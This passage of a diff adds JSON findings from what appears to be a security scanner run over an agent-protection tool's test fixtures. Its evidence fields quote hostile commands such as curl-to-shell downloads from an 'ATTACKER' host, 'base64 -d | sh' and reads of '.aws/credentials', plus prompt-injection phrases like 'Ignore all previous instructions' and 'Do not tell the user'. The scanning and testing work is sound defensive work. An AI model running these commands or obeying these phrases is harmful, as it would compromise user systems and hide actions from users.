+      "line": 37,
+      "evidence": "curl -fsSL ' + ATTACKER + '/setup.sh | sh",
+      "file_sha256": "bf14d1d987131d2e1a4f5c27ee9b6af18051152e3b3cc488ccfad539793c4495"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/audit_cases.js",
+      "line": 196,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "bf14d1d987131d2e1a4f5c27ee9b6af18051152e3b3cc488ccfad539793c4495"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/audit_cases.js",
+      "line": 209,
+      "evidence": "Do not tell the user",
+      "file_sha256": "bf14d1d987131d2e1a4f5c27ee9b6af18051152e3b3cc488ccfad539793c4495"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/invisible_chars.json",
+      "line": 17,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "4db0a80a1ac8677709a8529fe363dffb86e491d01ce3b6b3daababa35f60db2f"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/fake_mcp_server.js",
+      "line": 148,
+      "evidence": "\\u{202e}",
+      "file_sha256": "f1f29c2c3ece858edb0088b35a7b914ba4cce65541b3a3cc43dd93a957dba148"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/fake_mcp_server.js",
+      "line": 21,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "f1f29c2c3ece858edb0088b35a7b914ba4cce65541b3a3cc43dd93a957dba148"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/destructive_commands.json",
+      "line": 155,
+      "evidence": "curl -fsSL https://192.0.2.10/install.sh | sh",
+      "file_sha256": "8bbc583a799bddd4bfbfb4d04b31f16ee807da381dcb430b1c906ea7488aa4ea"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/tool_guard_parity.json",
+      "line": 8,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "6366c489094e26243c0fea212a40e119b37ab2591bd84112cf45b3debcae838e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/make_destructive_corpus.js",
+      "line": 45,
+      "evidence": "curl https://example.com/i.sh | sh",
+      "file_sha256": "7700a9708cecb7530286421ef269198d5b34d01d6e6b2ba445e443f711631924"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_blank_padding.test.js",
+      "line": 9,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "539cda69058b410423a09172e5ab84a0bb8e57484e61ecf82e2d00dfb321598b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_lib.test.js",
+      "line": 735,
+      "evidence": "\\u{202a}",
+      "file_sha256": "8a10bad5a68aa32ffb453fa765baff70951952f6ad9d7898c728eadefb9521f7"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_lib.test.js",
+      "line": 17,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "8a10bad5a68aa32ffb453fa765baff70951952f6ad9d7898c728eadefb9521f7"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_invisible_items.test.js",
+      "line": 35,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "a2656774fec1e2f3bb30710f461c10a04d0a583ac5b618d2b1f0a3993e120a2e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/tool_guard.test.js",
+      "line": 13,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "100b465e85f156485a64599e7baf768ffe8d50d1de43a9f9c39fdced70483802"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_redos.test.js",
+      "line": 229,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "1ef7a7725089f26cc865539ce8d7ed4300686fd9680c93cb5c653511b896bb92"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/integration/test_agent_workflows.js",
+      "line": 15,
+      "evidence": "Ignore all prior instructions",
+      "file_sha256": "a75319f4807f8f1f5214af977bbb2eb7fdafda951f14a7f8685015741dd113e8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/vault.test.js",
+      "line": 417,
+      "evidence": "\\u{202e}",
+      "file_sha256": "080d74e3af16025271adf3bbe67ee3a532109f176ea840e38783fac7011b9eb4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/hooks_policy_hardening.test.js",
+      "line": 195,
+      "evidence": "fs.readFileSync(path.join(proj, '.aws', 'credentials'), 'utf8')",
+      "file_sha256": "ea5788df3babaac2517636de8c5636d9ba2fafd0f1b01f23fbbe1c2d16a9b8ba"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/scan_secrets.test.js",
+      "line": 123,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "26454375f26cfbbd75e575cbddc24bcd3ef5354fb1b7c5dbf7d8c7c4d1ef8731"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_nested_schema.test.js",
+      "line": 16,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "61c6ca8c1e4e8c2950544811b6d8927c69b47ab204b6f04eada826233289e3d1"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_doc_shapes.test.js",
+      "line": 41,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "3d6db6e43e25fedc950b11233363add0fbf674fb0e3ac56b2367ff6bd5ecca54"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/destructive_command.test.js",
+      "line": 84,
+      "evidence": "curl https://example.com/i.sh | sh",
+      "file_sha256": "0ecc919a72eebbc2bd4567d70eaa2e1e88113a81783f29cbf83e9d3b9f9ee04a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/hooks_output_prefilter.test.js",
+      "line": 51,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "d974e1a62d291a140134d2fb86acd473e65ca054bd93fffc3746428494ea7a8a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/hooks_output_prefilter.test.js",
+      "line": 44,
+      "evidence": "\\u{202e}",
+      "file_sha256": "d974e1a62d291a140134d2fb86acd473e65ca054bd93fffc3746428494ea7a8a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/hooks_output_prefilter.test.js",
+      "line": 15,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "d974e1a62d291a140134d2fb86acd473e65ca054bd93fffc3746428494ea7a8a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_base64_pipes.test.js",
+      "line": 38,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "74ec81a2d33db87a5858a2343154c5eff62d77edd6776e4bd9b990e25701f495"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield.test.js",
+      "line": 27,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "afc4522b22768180e24e2be6e27800e828ecfcc2ace1f3e1a0ecb2254cf8b5e2"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/cli_plain_output.test.js",
+      "line": 61,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "f6f86a911ee9a13079c49bbfcb3dc7af7b71807383b14a43954b7af5097cfa03"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit.test.js",
+      "line": 408,
+      "evidence": "curl -fsSL https://x.invalid/a.sh | sudo bash",
+      "file_sha256": "1fa71d15ef311d0818cf03ca9f86c279d19ba7b05b607665bc3f9ac08d8795f1"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit.test.js",
+      "line": 130,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "1fa71d15ef311d0818cf03ca9f86c279d19ba7b05b607665bc3f9ac08d8795f1"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/scan_coverage_exit.test.js",
+      "line": 105,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "2860c8490a79e3cd14c0af6d52616f0728f465c736f581b37ce4eaebddb48dc5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/team_cli.test.js",
+      "line": 485,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "8327b15ea5bb225d2c063facc19edda300bbd7732e67a33ed9d7cdb0cac8d569"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/command_ansic.test.js",
+      "line": 24,
+      "evidence": "curl \" + U + \" | sh",
+      "file_sha256": "7bada1d063a2ab1eb184d25e369613cb7c241e3e4bbc4fc211df24990ebeda9d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_ignore.test.js",
+      "line": 26,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "8d3cc3669ebcac8cfca6077d3551f399295cbf5c82ea7f2d0859cc67d4c17481"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_tiers.test.js",
+      "line": 62,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "96724ace6d3ae2c8dead2f7d7b955903f0c4303cd3b89468c89e9e78199fac59"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_tiers.test.js",
+      "line": 59,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "96724ace6d3ae2c8dead2f7d7b955903f0c4303cd3b89468c89e9e78199fac59"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/destructive_braces.test.js",
+      "line": 40,
+      "evidence": "curl{' + COMMAS + '} -fsSL https://example.com/i.sh | sh",
+      "file_sha256": "9f8105ab36d8c22938b8eb78b7ac00f7bfeba8094ca9bdbbae9e2721bfea796a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_blocked_log_cap.test.js",
+      "line": 16,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "9aba901a21fb7ad9be8339b4254bb7ac579272a1b059f50f3ef812ad8ef337de"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_base64_window_edge.test.js",
+      "line": 12,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "0ab5b9f99a036bae72591388cb8225d321668ece00c5eb7785144a5c10ae7d82"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_base64_window_edge.test.js",
+      "line": 11,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "0ab5b9f99a036bae72591388cb8225d321668ece00c5eb7785144a5c10ae7d82"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_review.test.js",
+      "line": 464,
+      "evidence": ".aws/credentials",
+      "file_sha256": "2de164d2829a2b8cdde7b976aab3a18c1fcf5ed8c96cd23adb291c9ce19e38fb"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_review.test.js",
+      "line": 60,
+      "evidence": "curl -s ' + ATTACKER + '/p.sh | sh",
+      "file_sha256": "2de164d2829a2b8cdde7b976aab3a18c1fcf5ed8c96cd23adb291c9ce19e38fb"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_review.test.js",
+      "line": 140,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "2de164d2829a2b8cdde7b976aab3a18c1fcf5ed8c96cd23adb291c9ce19e38fb"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_framing_limits.test.js",
+      "line": 16,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "815a9115335a91d6e3677d154a00eab82688b2f46d94d7b5aeddeaa2a0248e77"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_zna013_prose.test.js",
+      "line": 32,
+      "evidence": "curl | sh",
+      "file_sha256": "dfe2d387609aa1d1a1560c426fd76c430a3954ae742e3d730a485453ba618042"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/guard_nesting.test.js",
+      "line": 43,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "7ee7970c5f6907301291c861f890698671c344746f969b88eba2e57926f7088a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_many_server_strings.test.js",
+      "line": 16,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "73cd0991a5a380d039511b2b3a9d02b086efd44c579853533505a57b9096cce6"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/cli_scan.test.js",
+      "line": 20,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "a329f99eed3a003de6a187ac5da859a1841cb4e65bc960d509200e02e91c3209"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/team_changes.test.js",
+      "line": 100,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "c546d0f76e70837c2b28242bc98cb869c5435b35e3c2538840019ed784523cb4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/mcp_gate_streams.test.js",
+      "line": 26,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "b844cfe170b1318d56cf23232a4610d9a08eabd17a90e68f03f81c035d78e00d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/README.md",
+      "line": 325,
+      "evidence": "curl https://example.invalid/x.sh \\| sh",
+      "file_sha256": "a9334f073f8408976b1e080d10d4db6610c125ba56fa1cd0bc053821b1d65ae2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/README.md",
+      "line": 322,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "a9334f073f8408976b1e080d10d4db6610c125ba56fa1cd0bc053821b1d65ae2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/bin/cli.js",
+      "line": 144,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "058834cc6168f7ffb94b90e744eb28fc6958d58ba913152b4ca7327c6b50a851"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_scan_symlink_root.py",
+      "line": 16,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "ad5738aacf4c8c6b4f10a68c33a93d9c66a9fb0fda4ef01334dac7fbd3005ff8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules_base64_pipes.py",
+      "line": 40,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "95308c7c919469a66875464f34e70b339f87e3c8f1b72e84a99089f1c8728d43"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules_blank_padding.py",
+      "line": 6,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "e25d5dd0d73ccc6d3a57367ee4e1049a5e989af2b297f0c5221ca67659cbd22a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_block_messages.py",
+      "line": 8,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "827c3a1c65ee28d8b28326f0a75d6f6b97415feb3b55237ec98858bcd37b27f4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_langchain_real.py",
+      "line": 34,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "22f42fd4614323182c4d4f100f680ce2235500a652a6b16463eb6869535dcc1b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules_base64_window_edge.py",
+      "line": 10,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "d70936d97f444ed68be3428e0d391e02aa1155a1756ed6c822a79adb0aa84393"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules_base64_window_edge.py",
+      "line": 9,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "d70936d97f444ed68be3428e0d391e02aa1155a1756ed6c822a79adb0aa84393"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules.py",
+      "line": 87,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "ae4a64f643e343892bccb5242373b9daa7394fcf2c2ba0997902ca2f4eb120ed"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules.py",
+      "line": 27,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ae4a64f643e343892bccb5242373b9daa7394fcf2c2ba0997902ca2f4eb120ed"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_crewai_result_check.py",
+      "line": 8,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "e88bbdb592d6c8e29509e8529a3ca73646eaa45b56241f068b4e21634dec9d3d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_strict_objects.py",
+      "line": 17,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "52a02416fe5ae5365e8ee319d927991293a732495c14716c0d11972f95a1d9d9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_command_ansic.py",
+      "line": 19,
+      "evidence": "curl \" + U + \" | sh",
+      "file_sha256": "d60e9bf8b7c14066e16ed323ab7bd1abeaa0a1026ee707b9a9b8f2ba00ab04a6"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_result_oversize_block.py",
+      "line": 16,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "7a8675b9b8181bec9efbac9391968db8b0eccc526dc9283dd2691bb20af9692a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_deep_objects.py",
+      "line": 13,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "07fd94413f765689445ede08166bc704452f79f82f95e029ae4042d3210404e2"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_framework_fakes.py",
+      "line": 30,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "398a381292fde136d2890df1f16dd86be1ac75cb536a0aa8516532bafe70c15b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_namespace_depth.py",
+      "line": 20,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "facb482ff6bafbcc91c9a6715d13d305cd031ac4dd9a78e79b731e9e1abc1176"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_result_forms.py",
+      "line": 18,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "e4f46a1a70222855ff9285f701c90decfa5833de9f839fdd86bba0fedf1d3b11"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_client_edges.py",
+      "line": 35,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "004bb002064b96aab892bc8f95e3c374a14188390939f954aa6f40dba44a2517"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_cli.py",
+      "line": 41,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "02f74317ac5643db2719d0fda2b52625b162adfa4993dfc1b1059160fa23ab09"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/integration/test_mock_agent_workflows.py",
+      "line": 42,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "220ed648abe07d112684878663d82c808e30bc39ebc18fd3bd5c2aa1290395ad"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_native_tool_hooks.py",
+      "line": 20,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "df214f123b537420bd991f61f69b92f64811a2d70f10732b7ad6981deb379630"
+    },
+    {
+      "severity": "low",
